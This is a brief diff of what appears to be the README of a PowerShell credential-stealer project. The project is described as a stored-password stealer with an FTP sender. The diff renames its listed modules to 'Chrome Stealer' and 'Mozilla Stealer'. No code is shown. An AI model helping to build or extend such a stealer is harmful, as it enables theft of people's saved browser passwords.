@@ -2,8 +2,9 @@
 Stored passwords stealer &amp;&amp; FTP sender written in PowerShell
 
 # *******Modules included*******
-Chrome
-Mozilla
+Chrome Stealer
+
+Mozilla Stealer
 
 
 *************TODO*************
